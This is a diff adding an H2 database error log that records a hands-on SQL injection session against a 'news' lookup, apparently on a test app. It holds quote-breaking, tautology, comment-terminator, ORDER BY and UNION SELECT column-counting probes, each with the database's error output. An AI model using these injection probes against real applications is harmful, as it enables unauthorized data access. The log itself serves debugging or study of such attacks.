@@ -1,0 +1,826 @@
+2016-05-02 10:05:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" already exists; SQL statement:
+CREATE TABLE users( id SERIAL PRIMARY KEY, title text NOT NULL, content text NOT NULL, hits int NOT NULL ) [42101-191]
+2016-05-02 10:05:30 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+drop table users [42102-191]
+2016-05-02 10:27:34 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 10:27:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Feature not supported: "VARCHAR +"; SQL statement:
+SELECT * FROM news WHERE id='1'+'' [50100-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.getUnsupportedException(DbException.java:216)
+	at org.h2.value.Value.throwUnsupportedExceptionForType(Value.java:1139)
+	at org.h2.value.Value.add(Value.java:466)
+	at org.h2.expression.Operation.getValue(Operation.java:145)
+	at org.h2.expression.Operation.optimize(Operation.java:326)
+	at org.h2.expression.Comparison.optimize(Comparison.java:180)
+	at org.h2.command.dml.Select.prepare(Select.java:855)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 10:27:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 10:27:50 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Division by zero: "1"; SQL statement:
+SELECT * FROM news WHERE id=1/0 [22012-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.value.ValueInt.divide(ValueInt.java:106)
+	at org.h2.expression.Operation.getValue(Operation.java:160)
+	at org.h2.expression.Operation.optimize(Operation.java:326)
+	at org.h2.expression.Comparison.optimize(Comparison.java:180)
+	at org.h2.command.dml.Select.prepare(Select.java:855)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 10:29:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/0"; SQL statement:
+SELECT * FROM news WHERE id='1/0' [22018-191]
+2016-05-02 10:29:50 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/0"; SQL statement:
+SELECT * FROM news WHERE id='1/0' [22018-191]
+2016-05-02 11:49:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 12:00:48 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 12:12:54 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1aa"; SQL statement:
+SELECT * FROM news WHERE id='1aa' [22018-191]
+2016-05-02 12:13:03 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1aa"; SQL statement:
+SELECT * FROM news WHERE id='1aa' [22018-191]
+2016-05-02 12:13:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "`"; SQL statement:
+SELECT * FROM news WHERE id='`' [22018-191]
+2016-05-02 12:13:10 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "``"; SQL statement:
+SELECT * FROM news WHERE id='``' [22018-191]
+2016-05-02 12:13:11 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "~"; SQL statement:
+SELECT * FROM news WHERE id='~' [22018-191]
+2016-05-02 12:13:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "~~"; SQL statement:
+SELECT * FROM news WHERE id='~~' [22018-191]
+2016-05-02 12:37:15 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 12:37:19 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~' [22018-191]
+2016-05-02 12:37:21 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~' [22018-191]
+2016-05-02 12:37:21 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~'' [42000-191]
+2016-05-02 12:37:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~'' [42000-191]
+2016-05-02 12:37:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~~~~'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~'' [42000-191]
+2016-05-02 12:37:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1#[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1#' [42000-191]
+2016-05-02 12:38:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1--' [22018-191]
+2016-05-02 12:38:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1-- ' [22018-191]
+2016-05-02 12:38:03 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1-[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1-' [42000-191]
+2016-05-02 12:38:04 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by' [42000-191]
+2016-05-02 12:38:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1 [22018-191]
+2016-05-02 12:38:10 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1 [22018-191]
+2016-05-02 12:38:11 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1' [42000-191]
+2016-05-02 12:38:21 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1#[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1#' [42000-191]
+2016-05-02 12:38:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1--' [22018-191]
+2016-05-02 12:38:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1-- ' [22018-191]
+2016-05-02 12:38:24 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1--a' [22018-191]
+2016-05-02 12:38:26 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1--' [22018-191]
+2016-05-02 12:38:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' order by 1[*]/*'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1/*' [42000-191]
+2016-05-02 12:38:55 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' or 1=1[*]/*'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' or 1=1/*' [42000-191]
+2016-05-02 12:38:58 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' or ''=''[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' or ''=''' [42000-191]
+2016-05-02 12:39:04 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' or ''=''[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' or ''=''' [42000-191]
+2016-05-02 12:39:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' or ''=''[*]/*'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' or ''=''/*' [42000-191]
+2016-05-02 12:39:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1~~~' or ''=''[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' or ''=''' [42000-191]
+2016-05-02 12:39:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' order by 1--' [22018-191]
+2016-05-02 12:39:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' --' [22018-191]
+2016-05-02 12:39:34 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,3--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:39:35 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:39:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,3,4,5--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:39:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:39:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,3--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:39:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~' UNION SELECT 1,2,  ' [*]"; expected "*, NOT, EXISTS, INTERSECTS"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2,--' [42001-191]
+2016-05-02 12:39:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1,2--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:39:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select 1--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:39:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~' UNION SELECT  ' [*]"; expected "TOP, LIMIT, DISTINCT, ALL, *, NOT, EXISTS, INTERSECTS"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union select--' [42001-191]
+2016-05-02 12:39:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1~~~' UNION  ' [*]"; expected "ALL, DISTINCT, (, SELECT, FROM"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' union--' [42001-191]
+2016-05-02 12:39:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~' --' [22018-191]
+2016-05-02 12:39:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~'--' [22018-191]
+2016-05-02 12:40:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1~~~"; SQL statement:
+SELECT * FROM news WHERE id='1~~~'--' [22018-191]
+2016-05-02 12:40:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id=''[*]'"; SQL statement:
+SELECT * FROM news WHERE id=''' [42000-191]
+2016-05-02 12:40:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1/1"; SQL statement:
+SELECT * FROM news WHERE id='1/1' [22018-191]
+2016-05-02 12:40:44 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Feature not supported: "VARCHAR +"; SQL statement:
+SELECT * FROM news WHERE id='1'+'' [50100-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.getUnsupportedException(DbException.java:216)
+	at org.h2.value.Value.throwUnsupportedExceptionForType(Value.java:1139)
+	at org.h2.value.Value.add(Value.java:466)
+	at org.h2.expression.Operation.getValue(Operation.java:145)
+	at org.h2.expression.Operation.optimize(Operation.java:326)
+	at org.h2.expression.Comparison.optimize(Comparison.java:180)
+	at org.h2.command.dml.Select.prepare(Select.java:855)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:40:45 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1'' [42000-191]
+2016-05-02 12:40:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM NEWS WHERE ID='1' ''[*] "; SQL statement:
+SELECT * FROM news WHERE id='1' '' [42000-191]
+2016-05-02 12:40:47 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1'[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1'' [42000-191]
+2016-05-02 12:40:53 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1' order by 1[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1' order by 1' [42000-191]
+2016-05-02 12:40:53 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM news WHERE id='1' order by 1#[*]'"; SQL statement:
+SELECT * FROM news WHERE id='1' order by 1#' [42000-191]
+2016-05-02 12:40:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Order by expression "5" must be in the result list in this case; SQL statement:
+SELECT * FROM news WHERE id='1' order by 5--' [90068-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.command.dml.Query.prepareOrder(Query.java:495)
+	at org.h2.command.dml.Select.prepare(Select.java:847)
+	at org.h2.command.Parser.prepareCommand(Parser.java:257)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:41:03 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1-"; SQL statement:
+SELECT * FROM news WHERE id='1-' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4 from news--' [22018-191]
+2016-05-02 12:41:10 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4 --' [22018-191]
+2016-05-02 12:41:10 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4,5--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:41:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4--' [22018-191]
+2016-05-02 12:41:14 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3--' [21002-191]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
+	at org.h2.message.DbException.get(DbException.java:179)
+	at org.h2.message.DbException.get(DbException.java:155)
+	at org.h2.message.DbException.get(DbException.java:144)
+	at org.h2.command.dml.SelectUnion.init(SelectUnion.java:282)
+	at org.h2.command.Parser.parseSelect(Parser.java:1693)
+	at org.h2.command.Parser.parsePrepared(Parser.java:443)
+	at org.h2.command.Parser.parse(Parser.java:315)
+	at org.h2.command.Parser.parse(Parser.java:287)
+	at org.h2.command.Parser.prepareCommand(Parser.java:252)
+	at org.h2.engine.Session.prepareLocal(Session.java:560)
+	at org.h2.engine.Session.prepareCommand(Session.java:501)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:170)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-02 12:41:16 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
+SELECT * FROM news WHERE id='1' union select 1,2,3,4 --' [22018-191]
+2016-05-02 12:41:17 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "Hello Wolrd:)"; SQL statement:
